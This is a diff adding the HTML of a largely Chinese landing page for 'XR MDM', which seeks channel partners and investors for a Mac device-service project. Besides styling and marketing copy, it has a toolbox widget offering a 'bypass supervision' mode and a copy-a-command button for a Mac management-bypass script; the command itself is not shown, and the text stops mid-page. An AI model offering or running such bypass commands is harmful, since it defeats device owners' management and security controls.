@@ -1,0 +1,1059 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="XR MDM 面向渠道、生态伙伴与战略投资人开放合作，共建 Mac 设备服务网络。">
+  <meta name="theme-color" content="#081c18">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="XR MDM · 战略合作">
+  <meta property="og:description" content="连接产品能力、市场渠道与长期资源。">
+  <meta property="og:image" content="https://mdm.xrsec.fun/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="XR MDM · Strategic Partnerships">
+  <meta name="twitter:description" content="Channel growth · Ecosystem · Strategic investment">
+  <meta name="twitter:image" content="https://mdm.xrsec.fun/og.png">
+  <link rel="shortcut icon" href="https://xrsec.s3.bitiful.net/IMG/20201208143817321505.png?w=50&fmt=webp&q=48">
+  <link rel="shortcut icon" href="https://xrsec.s3.bitiful.net/IMG/20201208143817321505.png?w=50&fmt=webp&q=48">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://xrsec.s3.bitiful.net/IMG/20201208143817321505.png?w=36&fmt=webp&q=48">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://xrsec.s3.bitiful.net/IMG/20201208143817321505.png?w=32&fmt=webp&q=48">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://xrsec.s3.bitiful.net/IMG/20201208143817321505.png?w=16&fmt=webp&q=48">
+  <link rel="mask-icon" href="https://xrsec.s3.bitiful.net/IMG/20201208143817321505.png?fmt=webp&q=48&w=128" color="#5bbad5">
+
+  <title>XR MDM · 战略合作</title>
+  <style>
+    :root {
+      --ink: #102821;
+      --muted: #66766f;
+      --paper: #f3f0e8;
+      --card: rgba(255, 255, 255, .68);
+      --line: rgba(16, 40, 33, .13);
+      --green: #0d6f52;
+      --lime: #d8f16a;
+      --orange: #f07146;
+      --night: #081c18;
+      --white: #fffef9;
+      --radius: 28px;
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      color: var(--ink);
+      background:
+        radial-gradient(circle at 92% 5%, rgba(216, 241, 106, .42), transparent 24rem),
+        radial-gradient(circle at 0 45%, rgba(240, 113, 70, .13), transparent 28rem),
+        var(--paper);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+    button, a { font: inherit; }
+    a { color: inherit; }
+    .wrap { width: min(1180px, calc(100% - 40px)); margin: 0 auto; }
+
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      background: rgba(243, 240, 232, .82);
+      border-bottom: 1px solid rgba(16, 40, 33, .08);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+    }
+    .nav-inner {
+      height: 76px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+    .brand { display: flex; align-items: center; gap: 12px; text-decoration: none; font-weight: 800; letter-spacing: -.02em; }
+    .brand-mark {
+      width: 38px;
+      height: 38px;
+      display: grid;
+      place-items: center;
+      color: var(--white);
+      background: var(--night);
+      border-radius: 12px;
+      font-size: 13px;
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.12);
+    }
+    .nav-links { display: flex; align-items: center; gap: 26px; }
+    .nav-links a { color: var(--muted); text-decoration: none; font-size: 14px; font-weight: 650; }
+    .nav-links a:hover { color: var(--ink); }
+    .language {
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      background: rgba(255,255,255,.55);
+      color: var(--ink);
+      padding: 9px 14px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 750;
+    }
+
+    .hero { padding: 76px 0 62px; overflow: hidden; }
+    .hero-grid { display: grid; grid-template-columns: minmax(0, 1.2fr) minmax(330px, .8fr); gap: 60px; align-items: center; }
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 9px;
+      margin-bottom: 24px;
+      color: var(--green);
+      font-size: 13px;
+      font-weight: 800;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+    }
+    .eyebrow::before { content: ""; width: 26px; height: 2px; background: var(--green); }
+    h1 {
+      max-width: 760px;
+      margin: 0;
+      font-size: clamp(46px, 6.5vw, 88px);
+      line-height: .98;
+      letter-spacing: -.065em;
+      font-weight: 850;
+    }
+    .accent { position: relative; color: var(--green); white-space: nowrap; }
+    .accent::after {
+      content: "";
+      position: absolute;
+      left: 2%; right: -2%; bottom: 4%; height: .13em;
+      background: var(--lime);
+      z-index: -1;
+      transform: rotate(-1deg);
+    }
+    .hero-copy { max-width: 650px; margin: 30px 0 0; color: var(--muted); font-size: 19px; line-height: 1.75; }
+    .actions { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 36px; }
+    .button {
+      min-height: 50px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 0 22px;
+      border: 1px solid var(--night);
+      border-radius: 14px;
+      background: var(--night);
+      color: var(--white);
+      text-decoration: none;
+      font-weight: 750;
+      cursor: pointer;
+      transition: transform .2s ease, box-shadow .2s ease;
+    }
+    .button:hover { transform: translateY(-2px); box-shadow: 0 12px 26px rgba(8, 28, 24, .18); }
+    .button.secondary { color: var(--ink); background: transparent; border-color: var(--line); }
+    .button .arrow { font-size: 20px; line-height: 1; }
+
+    .brief {
+      position: relative;
+      min-height: 470px;
+      padding: 34px;
+      border-radius: 36px;
+      color: var(--white);
+      background: var(--night);
+      box-shadow: 0 36px 80px rgba(8, 28, 24, .23);
+      overflow: hidden;
+    }
+    .brief::before {
+      content: "";
+      position: absolute;
+      width: 300px; height: 300px;
+      top: -150px; right: -100px;
+      border: 64px solid rgba(216, 241, 106, .9);
+      border-radius: 50%;
+    }
+    .brief::after {
+      content: "";
+      position: absolute;
+      width: 150px; height: 150px;
+      right: 36px; bottom: 40px;
+      border-radius: 42% 58% 60% 40%;
+      background: var(--orange);
+      transform: rotate(20deg);
+    }
+    .brief-top, .brief-bottom { position: relative; z-index: 2; }
+    .brief-top { display: flex; align-items: center; justify-content: space-between; font-size: 12px; letter-spacing: .13em; text-transform: uppercase; }
+    .status { display: flex; align-items: center; gap: 8px; }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--lime); box-shadow: 0 0 0 6px rgba(216,241,106,.12); }
+    .brief-bottom { position: absolute; left: 34px; right: 34px; bottom: 34px; }
+    .brief-kicker { margin: 0 0 12px; color: rgba(255,255,255,.58); font-size: 13px; }
+    .brief h2 { max-width: 270px; margin: 0 0 26px; font-size: 32px; line-height: 1.12; letter-spacing: -.035em; }
+    .brief-tags { display: flex; flex-wrap: wrap; gap: 8px; max-width: 310px; }
+    .brief-tag { padding: 8px 11px; border: 1px solid rgba(255,255,255,.17); border-radius: 999px; background: rgba(255,255,255,.07); font-size: 12px; }
+
+    .toolbox {
+      min-height: 470px;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      border-radius: 36px;
+      color: var(--white);
+      background: var(--night);
+      box-shadow: 0 36px 80px rgba(8, 28, 24, .23);
+      overflow: hidden;
+    }
+    .toolbox-top { display: flex; align-items: center; justify-content: space-between; gap: 16px; color: rgba(255,255,255,.56); font: 750 11px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: .1em; }
+    .mode-tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 7px; margin-top: 34px; padding: 6px; border-radius: 14px; background: rgba(255,255,255,.075); }
+    .mode-tab { min-height: 44px; border: 0; border-radius: 10px; color: rgba(255,255,255,.56); background: transparent; cursor: pointer; font-weight: 800; }
+    .mode-tab.active { color: var(--night); background: var(--lime); }
+    .toolbox-body { margin: auto 0 0; }
+    .toolbox-index { color: var(--orange); font: 800 12px/1 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .toolbox h2 { max-width: 330px; margin: 16px 0 12px; font-size: 34px; line-height: 1.08; letter-spacing: -.04em; }
+    .toolbox-copy { min-height: 54px; margin: 0; color: rgba(255,255,255,.62); font-size: 14px; line-height: 1.7; }
+    .copy-command { width: 100%; min-height: 54px; margin-top: 24px; border: 0; border-radius: 14px; color: var(--night); background: var(--lime); cursor: pointer; font-weight: 850; transition: transform .2s ease, filter .2s ease; }
+    .copy-command:hover { transform: translateY(-2px); filter: brightness(1.03); }
+    .command-note { margin: 12px 0 0; color: rgba(255,255,255,.4); font-size: 11px; line-height: 1.55; }
+
+    .ticker { border-block: 1px solid var(--line); overflow: hidden; }
+    .ticker-inner { min-height: 68px; display: flex; align-items: center; justify-content: space-between; gap: 24px; color: var(--muted); font-size: 13px; font-weight: 750; letter-spacing: .08em; text-transform: uppercase; }
+    .ticker-item { display: flex; align-items: center; gap: 10px; white-space: nowrap; }
+    .ticker-item::before { content: "✦"; color: var(--orange); }
+
+    main > section { padding: 104px 0; }
+    .section-head { display: grid; grid-template-columns: .8fr 1.2fr; gap: 48px; margin-bottom: 48px; align-items: end; }
+    .section-label { color: var(--green); font-size: 13px; font-weight: 800; letter-spacing: .12em; text-transform: uppercase; }
+    .section-title { margin: 0; font-size: clamp(34px, 4.8vw, 62px); line-height: 1.06; letter-spacing: -.05em; }
+    .section-desc { max-width: 680px; margin: 18px 0 0; color: var(--muted); font-size: 17px; line-height: 1.75; }
+
+    .value-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+    .value-card {
+      min-height: 290px;
+      padding: 28px;
+      display: flex;
+      flex-direction: column;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--card);
+      backdrop-filter: blur(12px);
+    }
+    .value-card:nth-child(2) { background: var(--green); color: white; border-color: transparent; }
+    .card-no { margin-bottom: auto; color: var(--orange); font: 800 13px/1 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .value-card:nth-child(2) .card-no { color: var(--lime); }
+    .value-card h3 { margin: 52px 0 12px; font-size: 24px; letter-spacing: -.03em; }
+    .value-card p { margin: 0; color: var(--muted); line-height: 1.7; }
+    .value-card:nth-child(2) p { color: rgba(255,255,255,.7); }
+
+    .dark-section { color: var(--white); background: var(--night); }
+    .dark-section .section-label { color: var(--lime); }
+    .dark-section .section-desc { color: rgba(255,255,255,.58); }
+    .model-list { border-top: 1px solid rgba(255,255,255,.16); }
+    .model {
+      display: grid;
+      grid-template-columns: 80px 1fr 1.1fr;
+      gap: 28px;
+      padding: 34px 0;
+      border-bottom: 1px solid rgba(255,255,255,.16);
+      align-items: start;
+    }
+    .model-no { color: var(--lime); font: 700 13px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .model h3 { margin: 0; font-size: 27px; letter-spacing: -.03em; }
+    .model p { margin: 0; color: rgba(255,255,255,.62); line-height: 1.75; }
+
+    .resource-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
+    .resource {
+      padding: 28px;
+      min-height: 200px;
+      border: 1px solid var(--line);
+      border-radius: 22px;
+      background: rgba(255,255,255,.5);
+    }
+    .resource-icon { width: 42px; height: 42px; display: grid; place-items: center; border-radius: 13px; background: var(--lime); font-size: 20px; }
+    .resource h3 { margin: 24px 0 8px; font-size: 20px; }
+    .resource p { margin: 0; color: var(--muted); line-height: 1.65; }
+
+    .roadmap { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0; border-block: 1px solid var(--line); }
+    .stage { position: relative; padding: 34px 28px 38px 0; }
+    .stage + .stage { padding-left: 28px; border-left: 1px solid var(--line); }
+    .stage-state { color: var(--green); font: 800 12px/1 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: .1em; }
+    .stage h3 { margin: 18px 0 10px; font-size: 22px; }
+    .stage p { margin: 0; color: var(--muted); line-height: 1.65; }
+
+    .contact { padding-top: 26px; }
+    .contact-card {
+      position: relative;
+      padding: clamp(38px, 7vw, 78px);
+      border-radius: 38px;
+      color: var(--white);
+      background: var(--green);
+      overflow: hidden;
+    }
+    .contact-card::after {
+      content: "XR";
+      position: absolute;
+      right: -18px; bottom: -62px;
+      color: rgba(255,255,255,.08);
+      font-size: 220px;
+      font-weight: 900;
+      letter-spacing: -.1em;
+    }
+    .contact-card h2 { position: relative; z-index: 1; max-width: 760px; margin: 0; font-size: clamp(38px, 6vw, 72px); line-height: 1.02; letter-spacing: -.055em; }
+    .contact-card p { position: relative; z-index: 1; max-width: 630px; margin: 24px 0 0; color: rgba(255,255,255,.74); font-size: 17px; line-height: 1.7; }
+    .contact-actions { position: relative; z-index: 1; display: flex; flex-wrap: wrap; gap: 12px; margin-top: 34px; }
+    .contact-card .button { color: var(--night); background: var(--lime); border-color: var(--lime); }
+    .contact-card .button.secondary { color: white; background: transparent; border-color: rgba(255,255,255,.28); }
+
+    footer { padding: 34px 0 42px; }
+    .footer-inner { display: flex; align-items: center; justify-content: space-between; gap: 24px; color: var(--muted); font-size: 12px; }
+    .footer-links { display: flex; gap: 18px; }
+    .footer-links a { text-decoration: none; }
+    .toast {
+      position: fixed;
+      z-index: 50;
+      left: 50%; bottom: 28px;
+      transform: translate(-50%, 20px);
+      padding: 11px 16px;
+      border-radius: 12px;
+      color: white;
+      background: var(--night);
+      opacity: 0;
+      pointer-events: none;
+      transition: .2s ease;
+      box-shadow: 0 10px 35px rgba(0,0,0,.18);
+    }
+    .toast.show { opacity: 1; transform: translate(-50%, 0); }
+    .legal-overlay {
+      position: fixed;
+      z-index: 80;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: rgba(4, 18, 15, .72);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+    }
+    .legal-overlay.show { display: flex; }
+    .legal-dialog {
+      width: min(780px, 100%);
+      max-height: min(820px, calc(100vh - 48px));
+      display: flex;
+      flex-direction: column;
+      border: 1px solid rgba(255,255,255,.13);
+      border-radius: 28px;
+      color: var(--ink);
+      background: var(--paper);
+      box-shadow: 0 36px 100px rgba(0,0,0,.34);
+      overflow: hidden;
+    }
+    .legal-head { display: flex; align-items: flex-start; justify-content: space-between; gap: 20px; padding: 24px 26px 18px; border-bottom: 1px solid var(--line); }
+    .legal-kicker { margin: 0 0 5px; color: var(--green); font: 800 11px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: .1em; }
+    .legal-head h2 { margin: 0; font-size: 25px; letter-spacing: -.035em; }
+    .legal-close { width: 38px; height: 38px; flex: 0 0 auto; border: 1px solid var(--line); border-radius: 11px; color: var(--ink); background: rgba(255,255,255,.55); cursor: pointer; font-size: 20px; }
+    .legal-scroll { min-height: 220px; flex: 1; padding: 22px 26px; overflow: auto; overscroll-behavior: contain; }
+    .legal-document { min-height: 360px; color: #263a34; font-size: 14px; line-height: 1.78; }
+    .legal-document section { padding: 0; }
+    .legal-document h1 { margin: 0 0 24px; color: #102821; font-size: 28px; line-height: 1.18; letter-spacing: -.035em; }
+    .legal-document h2 { margin: 30px 0 12px; padding-top: 4px; color: var(--green); font-size: 18px; line-height: 1.3; letter-spacing: -.015em; }
+    .legal-document p { margin: 0 0 13px; }
+    .legal-document ul, .legal-document ol { margin: 0 0 16px; padding-left: 1.5em; }
+    .legal-document li + li { margin-top: 6px; }
+    .legal-document .alert { padding: 16px 18px; border: 1px solid rgba(216,87,53,.24); border-radius: 14px; background: rgba(216,87,53,.075); }
+    .legal-document .alert strong { color: var(--orange); }
+    .legal-document .confirm { margin-top: 16px; padding: 18px; border-radius: 14px; color: #f8fff5; background: #102821; }
+    .legal-document .confirm h2 { color: var(--lime); }
+    .legal-document .confirm p:last-child { margin-bottom: 0; }
+    .legal-document code { padding: 2px 6px; border-radius: 6px; color: #102821; background: var(--lime); font: 800 13px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .legal-document .foot { margin-top: 30px; padding-top: 18px; border-top: 1px solid var(--line); color: var(--muted); font-size: 12px; }
+    .legal-loading { color: var(--muted); }
+    .legal-actions { padding: 18px 26px 24px; border-top: 1px solid var(--line); background: rgba(255,255,255,.35); }
+    .legal-scroll-tip { margin: 0 0 12px; color: var(--orange); font-size: 12px; font-weight: 750; }
+    .legal-check { position: relative; display: flex; align-items: flex-start; gap: 10px; color: var(--muted); font-size: 13px; line-height: 1.55; }
+    .legal-check input { position: absolute; width: 1px; height: 1px; margin: -1px; overflow: hidden; clip: rect(0 0 0 0); }
+    .legal-check-box { position: relative; width: 18px; height: 18px; flex: 0 0 18px; margin-top: 1px; border: 2px solid var(--green); border-radius: 4px; background: white; cursor: pointer; }
+    .legal-check input:focus + .legal-check-box { box-shadow: 0 0 0 3px rgba(13,111,82,.16); }
+    .legal-check input:checked + .legal-check-box { background: var(--green); }
+    .legal-check input:checked + .legal-check-box::after { content: ""; position: absolute; left: 5px; top: 1px; width: 4px; height: 9px; border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+    .legal-check input:disabled + .legal-check-box { border-color: #9ba8a3; background: #e5e5df; cursor: not-allowed; }
+    .legal-authorize { display: flex; justify-content: flex-end; gap: 9px; margin-top: 14px; }
+    .legal-cancel, .legal-confirm { min-height: 46px; border-radius: 11px; padding: 0 16px; cursor: pointer; font-weight: 800; }
+    .legal-cancel { border: 1px solid var(--line); color: var(--ink); background: transparent; }
+    .legal-confirm { border: 0; color: var(--night); background: var(--lime); }
+    .legal-confirm:disabled { cursor: not-allowed; opacity: .38; }
+    .guide-dialog {
+      width: min(900px, 100%);
+      max-height: min(860px, calc(100vh - 48px));
+      display: flex;
+      flex-direction: column;
+      border: 1px solid rgba(255,255,255,.13);
+      border-radius: 28px;
+      color: var(--ink);
+      background: var(--paper);
+      box-shadow: 0 36px 100px rgba(0,0,0,.34);
+      overflow: hidden;
+    }
+    .guide-scroll { padding: 24px 26px 28px; overflow: auto; overscroll-behavior: contain; }
+    .guide-intro { margin: 0 0 20px; color: var(--muted); line-height: 1.7; }
+    .guide-steps { display: grid; gap: 12px; margin: 0; padding: 0; list-style: none; counter-reset: guide-step; }
+    .guide-step { position: relative; padding: 18px 18px 18px 62px; border: 1px solid var(--line); border-radius: 16px; background: rgba(255,255,255,.46); counter-increment: guide-step; }
+    .guide-step::before { content: counter(guide-step); position: absolute; left: 18px; top: 18px; width: 28px; height: 28px; display: grid; place-items: center; border-radius: 9px; color: var(--night); background: var(--lime); font-weight: 850; }
+    .guide-step strong { display: block; margin-bottom: 5px; }
+    .guide-step p { margin: 0; color: var(--muted); line-height: 1.6; }
+    .guide-modes { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
+    .guide-mode { padding: 16px 18px; border-radius: 15px; color: rgba(255,255,255,.78); background: var(--night); line-height: 1.6; }
+    .guide-mode strong { display: block; margin-bottom: 4px; color: var(--lime); }
+    .guide-warning { margin: 24px 0 12px; color: var(--orange); font-size: 18px; }
+    .guide-warning-copy { margin: 0 0 14px; color: var(--muted); line-height: 1.7; }
+    .guide-images { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .guide-image-link { display: block; border-radius: 16px; background: white; overflow: hidden; }
+    .guide-image-link img { display: block; width: 100%; height: auto; }
+    .guide-actions { display: flex; justify-content: flex-end; margin-top: 20px; }
+    .guide-done { min-height: 46px; padding: 0 20px; border: 0; border-radius: 11px; color: var(--night); background: var(--lime); cursor: pointer; font-weight: 850; }
+
+    @media (max-width: 880px) {
+      .nav-links a { display: none; }
+      .hero { padding-top: 48px; }
+      .hero-grid, .section-head { grid-template-columns: 1fr; }
+      .hero-grid { gap: 40px; }
+      .brief { min-height: 400px; }
+      .value-grid { grid-template-columns: 1fr; }
+      .value-card { min-height: 235px; }
+      .model { grid-template-columns: 54px 1fr; }
+      .model p { grid-column: 2; }
+      .ticker-item:nth-child(n+3) { display: none; }
+    }
+    @media (max-width: 600px) {
+      .wrap { width: min(100% - 24px, 1180px); }
+      .nav-inner { height: 64px; }
+      .brand-name { display: none; }
+      h1 { font-size: 48px; }
+      .hero-copy { font-size: 17px; }
+      .brief { padding: 24px; border-radius: 28px; }
+      .brief-bottom { left: 24px; right: 24px; bottom: 24px; }
+      main > section { padding: 76px 0; }
+      .resource-grid, .roadmap { grid-template-columns: 1fr; }
+      .stage { padding: 26px 0; }
+      .stage + .stage { padding-left: 0; border-left: 0; border-top: 1px solid var(--line); }
+      .model { grid-template-columns: 38px 1fr; gap: 14px; }
+      .footer-inner { align-items: flex-start; flex-direction: column; }
+      .legal-overlay { padding: 10px; }
+      .legal-dialog { max-height: calc(100dvh - 20px); border-radius: 20px; }
+      .legal-head, .legal-scroll { padding-inline: 18px; }
+      .legal-actions { padding: 16px 18px 18px; }
+      .legal-authorize button { flex: 1; }
+      .guide-dialog { max-height: calc(100dvh - 20px); border-radius: 20px; }
+      .guide-scroll { padding: 20px 18px 22px; }
+      .guide-modes, .guide-images { grid-template-columns: 1fr; }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      html { scroll-behavior: auto; }
+      *, *::before, *::after { transition: none !important; }
+    }
+  </style>
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <a class="brand" href="#top" aria-label="XR MDM home">
+        <span class="brand-mark">XR</span>
+        <span class="brand-name">XR MDM</span>
+      </a>
+      <nav class="nav-links" aria-label="Main navigation">
+        <a href="#value" data-i18n="navValue">项目价值</a>
+        <a href="#partners" data-i18n="navPartners">合作商</a>
+        <a href="#models" data-i18n="navModels">合作模式</a>
+        <a href="#roadmap" data-i18n="navRoadmap">共建路径</a>
+        <a href="#contact" data-i18n="navContact">联系合作</a>
+        <button class="language" id="languageButton" type="button" aria-label="Switch language">EN</button>
+      </nav>
+    </div>
+  </header>
+
+  <main id="top">
+    <section class="hero">
+      <div class="wrap hero-grid">
+        <div>
+          <div class="eyebrow" data-i18n="eyebrow">战略合作 · 资源共建</div>
+          <h1 data-i18n-html="heroTitle">让 Mac 设备服务<br>成为<span class="accent">增长生意</span></h1>
+          <p class="hero-copy" data-i18n="heroCopy">我们正在把成熟的设备服务能力，升级为更清晰、更可靠、可规模化的合作网络。现面向渠道伙伴、生态伙伴与战略投资人开放合作。</p>
+          <div class="actions">
+            <a class="button" href="#contact"><span data-i18n="talk">洽谈合作</span><span class="arrow">↗</span></a>
+            <a class="button secondary" href="#models" data-i18n="explore">查看合作方向</a>
+          </div>
+        </div>
+        <aside class="toolbox" aria-label="Mac management tools">
+          <div class="toolbox-top"><span>MAC TOOLKIT / 01</span><span class="status"><span class="status-dot"></span><span data-i18n="ready">在线可用</span></span></div>
+          <div class="mode-tabs" role="tablist" aria-label="选择操作">
+            <button class="mode-tab active" id="bypassTab" type="button" role="tab" aria-selected="true" data-mode="bypass" data-i18n="bypassTab">绕过监管</button>
+            <button class="mode-tab" id="analyzeTab" type="button" role="tab" aria-selected="false" data-mode="analyze" data-i18n="analyzeTab">分析监管</button>
+          </div>
+          <div class="toolbox-body">
+            <span class="toolbox-index" id="toolIndex">01 / BYPASS</span>
+            <h2 id="toolTitle" data-i18n="bypassTitle">进入维护与清理工具</h2>
+            <p class="toolbox-copy" id="toolCopy" data-i18n="bypassCopy">下载到安全临时文件，完成 Bash 语法检查后启动。</p>
+            <button class="copy-command" id="copyCommand" type="button" data-i18n="copyCommand">一键复制命令</button>
+            <p class="command-note" data-i18n="commandNote">命令不会通过管道直接执行网络内容；运行前仍需在终端确认。</p>
+          </div>
+        </aside>
+      </div>
+    </section>
+
+    <div class="ticker">
+      <div class="wrap ticker-inner">
+        <span class="ticker-item" data-i18n="tickerOne">Intel & Apple Silicon</span>
+        <span class="ticker-item" data-i18n="tickerTwo">中英双语服务</span>
+        <span class="ticker-item" data-i18n="tickerThree">Web & CLI 触达</span>
+        <span class="ticker-item" data-i18n="tickerFour">灵活合作机制</span>
+      </div>
+    </div>
+
+    <section id="value">
+      <div class="wrap">
+        <div class="section-head">
+          <div class="section-label" data-i18n="valueLabel">为什么是现在</div>
+          <div>
+            <h2 class="section-title" data-i18n="valueTitle">从技术能力，走向可复制的合作价值</h2>
+            <p class="section-desc" data-i18n="valueDesc">项目已经形成清晰的服务入口与跨架构交付能力。下一阶段的关键不是堆叠功能，而是连接更好的渠道、服务场景和商业资源。</p>
+          </div>
+        </div>
+        <div class="value-grid">
+          <article class="value-card">
+            <span class="card-no">01 / PRODUCT</span>
+            <h3 data-i18n="valueOneTitle">轻量可达</h3>
+            <p data-i18n="valueOneCopy">一个入口同时服务网页访客与命令行用户，降低触达成本，为进一步产品化保留空间。</p>
+          </article>
+          <article class="value-card">
+            <span class="card-no">02 / SERVICE</span>
+            <h3 data-i18n="valueTwoTitle">面向真实场景</h3>
+            <p data-i18n="valueTwoCopy">聚焦 Mac 设备服务链路，以稳定、清晰、可协作为原则，适合与既有服务网络组合。</p>
+          </article>
+          <article class="value-card">
+            <span class="card-no">03 / GROWTH</span>
+            <h3 data-i18n="valueThreeTitle">合作优先</h3>
+            <p data-i18n="valueThreeCopy">支持渠道、生态和资源多种合作方式，以共同验证、阶段复盘和长期价值为导向。</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="dark-section" id="models">
+      <div class="wrap">
+        <div class="section-head">
+          <div class="section-label" data-i18n="modelLabel">合作模式</div>
+          <div>
+            <h2 class="section-title" data-i18n="modelTitle">不是单一融资，而是找到正确的共同建设者</h2>
+            <p class="section-desc" data-i18n="modelDesc">合作方案可围绕双方资源定制。我们更看重能力互补、长期信任和可以被验证的共同目标。</p>
+          </div>
+        </div>
+        <div class="model-list">
+          <article class="model">
+            <span class="model-no">01</span>
+            <h3 data-i18n="modelOneTitle">渠道合作</h3>
+            <p data-i18n="modelOneCopy">面向设备服务商、企业 IT 服务商与垂直渠道，共同建立客户触达、服务交付和反馈闭环。</p>
+          </article>
+          <article class="model">
+            <span class="model-no">02</span>
+            <h3 data-i18n="modelTwoTitle">生态共建</h3>
+            <p data-i18n="modelTwoCopy">与软硬件伙伴、云服务和专业服务团队协作，补齐产品、合规、运维与客户成功能力。</p>
+          </article>
+          <article class="model">
+            <span class="model-no">03</span>
+            <h3 data-i18n="modelThreeTitle">战略投资</h3>
+            <p data-i18n="modelThreeCopy">引入理解技术服务与长期运营的产业或财务伙伴，共同推进产品化、品牌建设与市场拓展。</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="partners">
+      <div class="wrap">
+        <div class="section-head">
+          <div class="section-label" data-i18n="partnerLabel">合作商</div>
+          <div>
+            <h2 class="section-title" data-i18n="partnerTitle">一起把 Mac 服务做得更完整</h2>
+            <p class="section-desc" data-i18n="partnerDesc">这里展示当前开放的合作商角色。确认真实合作商后，可直接将名称与简介替换为正式资料。</p>
+          </div>
+        </div>
+        <div class="value-grid">
+          <article class="value-card">
+            <span class="card-no">01 / DEVICE</span>
+            <h3 data-i18n="partnerOneTitle">设备服务合作商</h3>
+            <p data-i18n="partnerOneCopy">提供 Mac 流通、检测、交付与售后能力，共同缩短从设备到服务的链路。</p>
+          </article>
+          <article class="value-card">
+            <span class="card-no">02 / ENTERPRISE</span>
+            <h3 data-i18n="partnerTwoTitle">企业 IT 合作商</h3>
+            <p data-i18n="partnerTwoCopy">连接企业客户、IT 运维与设备管理场景，共建标准化交付和反馈机制。</p>
+          </article>
+          <article class="value-card">
+            <span class="card-no">03 / SECURITY</span>
+            <h3 data-i18n="partnerThreeTitle">安全与合规合作商</h3>
+            <p data-i18n="partnerThreeCopy">围绕终端识别、数据合规和风险边界，为产品提供专业审核与长期治理能力。</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="resources">
+      <div class="wrap">
+        <div class="section-head">
+          <div class="section-label" data-i18n="resourceLabel">期待的资源</div>
+          <div>
+            <h2 class="section-title" data-i18n="resourceTitle">把互补能力，变成共同增量</h2>
+            <p class="section-desc" data-i18n="resourceDesc">如果你在以下任一方向拥有经验或资源，我们愿意从一次具体合作开始。</p>
+          </div>
+        </div>
+        <div class="resource-grid">
+          <article class="resource"><span class="resource-icon">↗</span><h3 data-i18n="resourceOneTitle">市场与渠道</h3><p data-i18n="resourceOneCopy">企业客户、设备流通、IT 服务网络及跨区域市场拓展。</p></article>
+          <article class="resource"><span class="resource-icon">◎</span><h3 data-i18n="resourceTwoTitle">产品与运营</h3><p data-i18n="resourceTwoCopy">产品化方法、服务标准、客户成功与规模化运营经验。</p></article>
+          <article class="resource"><span class="resource-icon">◇</span><h3 data-i18n="resourceThreeTitle">合规与生态</h3><p data-i18n="resourceThreeCopy">企业设备管理、数据合规、安全治理和行业生态协同。</p></article>
+          <article class="resource"><span class="resource-icon">+</span><h3 data-i18n="resourceFourTitle">资本与长期资源</h3><p data-i18n="resourceFourCopy">理解技术服务长期价值，并能提供产业协同的合作伙伴。</p></article>
+        </div>
+      </div>
+    </section>
+
+    <section id="roadmap">
+      <div class="wrap">
+        <div class="section-head">
+          <div class="section-label" data-i18n="roadmapLabel">共建路径</div>
+          <div><h2 class="section-title" data-i18n="roadmapTitle">小步验证，清晰复盘，长期同行</h2></div>
+        </div>
+        <div class="roadmap">
+          <article class="stage"><span class="stage-state">READY</span><h3 data-i18n="stageOneTitle">能力对齐</h3><p data-i18n="stageOneCopy">交换资源与目标，明确双方最有价值的合作切入点。</p></article>
+          <article class="stage"><span class="stage-state">PILOT</span><h3 data-i18n="stageTwoTitle">联合验证</h3><p data-i18n="stageTwoCopy">以小范围场景验证交付、市场反馈和协作效率。</p></article>
+          <article class="stage"><span class="stage-state">SCALE</span><h3 data-i18n="stageThreeTitle">规模共建</h3><p data-i18n="stageThreeCopy">基于真实结果设计长期机制，放大产品与渠道价值。</p></article>
+        </div>
+      </div>
+    </section>
+
+    <section class="contact" id="contact">
+      <div class="wrap">
+        <div class="contact-card">
